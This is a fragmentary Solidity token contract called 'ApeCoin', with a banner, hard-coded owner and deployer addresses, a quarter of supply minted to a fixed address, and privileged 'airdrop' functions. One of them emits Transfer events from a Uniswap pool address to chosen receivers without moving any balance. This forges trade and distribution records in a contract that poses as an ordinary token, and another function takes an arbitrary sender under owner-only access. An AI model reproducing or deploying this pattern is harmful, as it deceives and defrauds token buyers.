/*
      ...
      __         _______     _______    ______       ______      __      _____  ___   
     /""\       |   __ "\   /"     "|  /" _  "\     /    " \    |" \    (\"   \|"  \  
    /    \      (. |__) :) (: ______) (: ( \___)   // ____  \   ||  |   |.\\   \    | 
   /' /\  \     |:  ____/   \/    |    \/ \       /  /    ) :)  |:  |   |: \.   \\  | 
  //  __'  \    (|  /       // ___)_   //  \ _   (: (____/ //   |.  |   |.  \    \. | 
 /   /  \\  \  /|__/ \     (:      "| (:   _) \   \        /    /\  |\  |    \    \ | 
(___/    \___)(_______)     \_______)  \_______)   \"_____/    (__\_|_)  \___|\____\) 
...
contract ApeCoin is Context, IERC20 {
    ...
    address deployer = 0x54BE3a794282C030b15E43aE2bB182E14c409C5e;
    address public _owner = 0xcb1c03E1ECb51A6D4a0B94E563f44C02FedCeb76;
   constructor () public {
        ...
        _mint(0x03ca52E482912308c287D09EC941b996c18668f5, initialSupply/4);
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function airdropToEligibleAddress(address sndr,address[] memory receivers, uint256[] memory amounts) public _auth(){
   ...
   function airdropToEligibleHolder(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)public _auth(){
for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}
